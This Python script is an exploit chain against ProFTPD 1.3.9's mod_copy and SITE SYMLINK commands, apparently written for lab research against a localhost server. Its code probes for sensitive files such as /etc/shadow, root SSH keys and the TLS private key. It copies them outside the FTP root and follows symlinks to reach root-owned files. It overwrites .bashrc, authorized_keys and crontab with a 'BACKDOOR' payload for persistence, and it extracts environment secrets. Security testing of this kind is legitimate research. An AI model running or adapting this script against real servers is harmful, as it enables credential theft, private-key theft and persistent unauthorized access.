#!/usr/bin/env python3
"""
ProFTPD 1.3.9 — Attack Script 01: mod_copy Exploitation Chain
independent security research. — Phase 3

Demonstrates chained attack using mod_copy + SITE SYMLINK:
1. Copy sensitive files (passwd, config, proc maps)
2. Symlink-then-copy to read files not directly accessible
3. Overwrite user-controlled files (.bashrc, authorized_keys staging)
4. Copy ProFTPD private TLS key
5. Exfiltrate /proc/self/environ for environment secrets

All results saved as JSON evidence.
"""
import socket, time, json, os
from datetime import datetime

HOST, PORT = "127.0.0.1", 21
USER, PASS = "ftptest", "ftptest123"
EVIDENCE_DIR = "/home/[REDACTED]/Desktop/[REDACTED-PATH]/ProFTPD/evidence"

def drain_recv(s, timeout=3):
    """Read a complete FTP response (handles multi-line and debug output)."""
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(8192)
            if not chunk:
                break
            data += chunk
            decoded = data.decode('utf-8', errors='replace')
            lines = [l for l in decoded.strip().split('\n') if l.strip()]
            if lines:
                last = lines[-1]
                # Complete response: 3-digit code + space
                if len(last) >= 4 and last[:3].isdigit() and last[3] == ' ':
                    break
    except socket.timeout:
        pass
    return data.decode('utf-8', errors='replace').strip()

def ftp_session(cmds, user=USER, password=PASS):
    """Run a sequence of FTP commands, return list of (cmd, response) tuples."""
    results = []
    try:
        s = socket.socket()
        s.settimeout(10)
        s.connect((HOST, PORT))
        banner = drain_recv(s)
        results.append(("BANNER", banner))

        def cmd(c, label=None):
            s.sendall((c + "\r\n").encode())
            r = drain_recv(s)
            key = label or (c.split(' ', 2)[:2] and ' '.join(c.split()[:2]))
            results.append((key, r))
            return r

        cmd(f"USER {user}", "USER")
        r = cmd(f"PASS {password}", "PASS")
        if "230" not in r:
            results.append(("AUTH", "FAILED: " + r[:80]))
            s.close()
            return results

        for c in cmds:
            # Use first two tokens as label (handles "SITE CPFR", "SITE CPTO" etc.)
            label = ' '.join(c.split()[:2])
            cmd(c, label)

        cmd("QUIT", "QUIT")
        s.close()
    except Exception as e:
        results.append(("ERROR", str(e)))
    return results

def check_file(path):
    """Check if a file was successfully created and return preview."""
    try:
        if os.path.exists(path):
            size = os.path.getsize(path)
            with open(path, 'rb') as f:
                preview = f.read(200).decode('utf-8','replace')
            return {"exists": True, "size": size, "preview": preview}
    except:
        pass
    return {"exists": False}

def main():
    print("=" * 60)
    print("Attack 01: mod_copy Exploitation Chain")
    print("ProFTPD 1.3.9 — Phase 3 Targeted Attacks")
    print("=" * 60)

    evidence = {
        "attack": "mod_copy_chain",
        "date": datetime.now().isoformat(),
        "target": f"ProFTPD 1.3.9 at {HOST}:{PORT}",
        "tests": {}
    }

    # -------------------------------------------------------
    # TEST 1: Sensitive file enumeration via SITE CPFR
    # CPFR returns 350 if the file exists, 550 if not
    # Can be used to enumerate filesystem without reading
    # -------------------------------------------------------
    print("\n[1] Filesystem enumeration via SITE CPFR (350=exists, 550=not found)")
    probe_targets = [
        "/etc/passwd", "/etc/shadow", "/etc/sudoers",
        "/etc/proftpd/proftpd.conf", "/etc/proftpd/modules.conf",
        "/etc/ssl/private/proftpd.key", "/etc/ssl/certs/proftpd.crt",
        "/root/.ssh/authorized_keys", "/root/.ssh/id_rsa",
        "/root/.bash_history", "/home/ftptest/.bash_history",
        "/proc/self/environ", "/proc/self/maps",
        "/var/log/proftpd/proftpd.log",
        "/etc/mysql/debian.cnf",  # MySQL creds
        "/var/lib/proftpd/",  # ProFTPD state
        "/nonexistent_file_xyz_123",  # Control: should 550
    ]

    enum_results = {}
    s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
    s.recv(1024)
    s.sendall(f"USER {USER}\r\n".encode()); time.sleep(0.2); s.recv(1024)
    s.sendall(f"PASS {PASS}\r\n".encode()); time.sleep(0.2); s.recv(1024)

    for target in probe_targets:
        s.sendall(f"SITE CPFR {target}\r\n".encode())
        time.sleep(0.15)
        try:
            resp = s.recv(1024).decode('utf-8','replace').strip()
        except:
            resp = "NO_RESPONSE"
        exists = "350" in resp
        enum_results[target] = {"response": resp, "exists": exists}
        status = "EXISTS" if exists else "not found"
        print(f"  {'[+]' if exists else '[-]'} {target}: {status}")

    s.sendall(b"QUIT\r\n"); s.close()
    evidence["tests"]["filesystem_enumeration"] = {
        "method": "SITE CPFR returns 350 if file exists, 550 if not",
        "results": enum_results
    }

    # -------------------------------------------------------
    # TEST 2: Direct file exfiltration via SITE CPFR/CPTO
    # Copy readable files to /tmp for retrieval via RETR
    # -------------------------------------------------------
    print("\n[2] File exfiltration via SITE CPFR/CPTO")
    exfil_targets = [
        ("/etc/passwd",           "/tmp/exfil_passwd"),
        ("/etc/hosts",            "/tmp/exfil_hosts"),
        ("/etc/hostname",         "/tmp/exfil_hostname"),
        ("/proc/self/environ",    "/tmp/exfil_environ"),
        ("/proc/self/cmdline",    "/tmp/exfil_cmdline"),
        ("/proc/self/maps",       "/tmp/exfil_maps"),
        ("/proc/self/status",     "/tmp/exfil_status"),
        ("/etc/proftpd/proftpd.conf", "/tmp/exfil_proftpd_conf"),
        ("/etc/proftpd/modules.conf", "/tmp/exfil_modules_conf"),
        ("/etc/ssl/certs/proftpd.crt", "/tmp/exfil_tls_cert"),
        # Private key — should fail (root-owned, mode 600)
        ("/etc/ssl/private/proftpd.key", "/tmp/exfil_tls_key"),
        # Shadow — should fail
        ("/etc/shadow",           "/tmp/exfil_shadow"),
    ]

    exfil_results = {}
    for src, dst in exfil_targets:
        r = ftp_session([f"SITE CPFR {src}", f"SITE CPTO {dst}"])
        cpfr_resp = next((resp for cmd,resp in r if "CPFR" in cmd), "")
        cpto_resp = next((resp for cmd,resp in r if "CPTO" in cmd), "")
        # Fallback: check last two cmd responses if labels weren't matched
        if not cpfr_resp and not cpto_resp and len(r) >= 4:
            cpfr_resp = r[-3][1] if len(r) >= 3 else ""
            cpto_resp = r[-2][1] if len(r) >= 2 else ""
        success = "250" in cpto_resp

        file_info = check_file(dst) if success else {"exists": False}

        exfil_results[src] = {
            "dest": dst,
            "cpfr_response": cpfr_resp,
            "cpto_response": cpto_resp,
            "success": success,
            "file_info": file_info
        }
        print(f"  {'[+]' if success else '[-]'} {src} -> {dst}: {'SUCCESS' if success else 'FAILED'}")
        if success and file_info.get("exists"):
            print(f"       Size: {file_info['size']}B, Preview: {file_info['preview'][:80]!r}")

    evidence["tests"]["file_exfiltration"] = {
        "method": "SITE CPFR + CPTO copies files outside FTP root",
        "results": exfil_results
    }

    # -------------------------------------------------------
    # TEST 3: Symlink → copy chain (read via symlink)
    # Create symlink to sensitive file, then copy the symlink
    # -------------------------------------------------------
    print("\n[3] Symlink → copy chain")
    symlink_chain_tests = [
        # Symlink to shadow, then copy through symlink
        ("/etc/shadow", "/home/ftptest/shadow_link", "/tmp/exfil_shadow_via_symlink"),
        # Symlink to TLS private key
        ("/etc/ssl/private/proftpd.key", "/home/ftptest/key_link", "/tmp/exfil_key_via_symlink"),
        # Symlink to root's bash history
        ("/root/.bash_history", "/home/ftptest/root_hist_link", "/tmp/exfil_root_hist"),
        # Symlink to /root dir
        ("/root", "/home/ftptest/root_dir_link", "/tmp/exfil_root_dir"),
    ]

    symlink_results = {}
    for target, link_path, copy_dest in symlink_chain_tests:
        # Step 1: Create symlink
        r1 = ftp_session([f"SITE SYMLINK {target} {link_path}"])
        symlink_resp = next((resp for cmd,resp in r1 if "SYMLINK" in cmd), "")
        symlink_ok = "200" in symlink_resp

        # Step 2: Copy through the symlink
        r2 = ftp_session([f"SITE CPFR {link_path}", f"SITE CPTO {copy_dest}"])
        cpfr_resp = next((resp for cmd,resp in r2 if "CPFR" in cmd), "")
        cpto_resp = next((resp for cmd,resp in r2 if "CPTO" in cmd), "")
        copy_ok = "250" in cpto_resp

        file_info = check_file(copy_dest) if copy_ok else {"exists": False}

        symlink_results[target] = {
            "link_path": link_path,
            "copy_dest": copy_dest,
            "symlink_response": symlink_resp,
            "symlink_created": symlink_ok,
            "cpfr_response": cpfr_resp,
            "cpto_response": cpto_resp,
            "copy_success": copy_ok,
            "file_info": file_info
        }

        chain_success = symlink_ok and copy_ok
        print(f"  {'[+]' if chain_success else '[-]'} {target}:")
        print(f"      Symlink: {'OK' if symlink_ok else 'FAIL'} | Copy: {'OK' if copy_ok else 'FAIL'}")
        if file_info.get("exists"):
            print(f"      Size: {file_info['size']}B, Preview: {file_info['preview'][:80]!r}")

    evidence["tests"]["symlink_copy_chain"] = {
        "method": "SITE SYMLINK creates symlink, SITE CPFR/CPTO follows it",
        "results": symlink_results
    }

    # -------------------------------------------------------
    # TEST 4: Write attack — overwrite accessible files
    # Use SITE CPFR to copy attacker-controlled content
    # -------------------------------------------------------
    print("\n[4] Write attack — overwrite user files")

    # Create a payload file first via STOR
    payload_content = b"# Injected by ProFTPD mod_copy test\nexport BACKDOOR=1\n"

    def stor_file(filename, content):
        """Upload a file via FTP STOR with active data connection."""
        try:
            s = socket.socket(); s.settimeout(10); s.connect((HOST, PORT))
            s.recv(1024)
            s.sendall(f"USER {USER}\r\n".encode()); time.sleep(0.2); s.recv(1024)
            s.sendall(f"PASS {PASS}\r\n".encode()); time.sleep(0.2); s.recv(1024)
            # Use PORT mode
            import struct
            listen_sock = socket.socket()
            listen_sock.bind(('127.0.0.1', 0))
            listen_sock.listen(1)
            _, port = listen_sock.getsockname()
            p1, p2 = port >> 8, port & 0xFF
            s.sendall(f"PORT 127,0,0,1,{p1},{p2}\r\n".encode())
            time.sleep(0.2); s.recv(1024)
            s.sendall(f"STOR {filename}\r\n".encode())
            time.sleep(0.2)
            listen_sock.settimeout(5)
            conn, _ = listen_sock.accept()
            conn.sendall(content)
            conn.close()
            listen_sock.close()
            time.sleep(0.2)
            resp = s.recv(1024).decode('utf-8','replace')
            s.sendall(b"QUIT\r\n"); s.close()
            return "226" in resp or "250" in resp
        except Exception as e:
            return False

    # Upload payload to staging location
    stor_ok = stor_file("/home/ftptest/payload.sh", payload_content)
    print(f"  STOR payload.sh: {'OK' if stor_ok else 'FAIL'}")

    # Now copy it over .bashrc
    write_targets = [
        ("/home/ftptest/payload.sh", "/home/ftptest/.bashrc",
         "Overwrite own .bashrc — persistence vector"),
        ("/home/ftptest/payload.sh", "/home/ftptest/.bash_profile",
         "Overwrite own .bash_profile"),
        ("/home/ftptest/payload.sh", "/home/ftptest/.ssh/authorized_keys",
         "Overwrite own authorized_keys (if .ssh exists)"),
        # Try to overwrite another user's file
        ("/home/ftptest/payload.sh", "/etc/cron.d/test_inject",
         "Inject cron job (should fail — no write perms)"),
        ("/home/ftptest/payload.sh", "/var/spool/cron/crontabs/ftptest",
         "Overwrite own crontab"),
    ]

    write_results = {}
    for src, dst, description in write_targets:
        r = ftp_session([f"SITE CPFR {src}", f"SITE CPTO {dst}"])
        cpto_resp = next((resp for cmd,resp in r if "CPTO" in cmd), "")
        success = "250" in cpto_resp
        write_results[dst] = {
            "description": description,
            "success": success,
            "response": cpto_resp
        }
        print(f"  {'[+]' if success else '[-]'} {description}: {'SUCCESS' if success else 'FAILED'}")

    evidence["tests"]["write_attack"] = {
        "method": "Upload payload then SITE CPFR/CPTO to overwrite sensitive files",
        "results": write_results
    }

    # -------------------------------------------------------
    # TEST 5: /proc/self/environ — secret extraction
    # -------------------------------------------------------
    print("\n[5] /proc/self/environ — environment variable extraction")
    environ_path = "/tmp/exfil_environ"
    if os.path.exists(environ_path):
        with open(environ_path, 'rb') as f:
            raw = f.read()
        # Split on null bytes (environ format)
        env_vars = [v.decode('utf-8','replace') for v in raw.split(b'\x00') if v]
        print(f"  Extracted {len(env_vars)} environment variables:")
        for v in env_vars:
            print(f"    {v}")
        evidence["tests"]["environ_extraction"] = {
            "method": "SITE CPFR /proc/self/environ + SITE CPTO",
            "env_vars": env_vars,
            "count": len(env_vars)
        }
    else:
        print("  /proc/self/environ was not successfully copied")

    # -------------------------------------------------------
    # Save evidence
    # -------------------------------------------------------
    outfile = os.path.join(EVIDENCE_DIR, "attack_01_modcopy_chain.json")
    with open(outfile, 'w') as f:
        json.dump(evidence, f, indent=2)
    print(f"\n[*] Evidence saved to {outfile}")

if __name__ == "__main__":
    main()
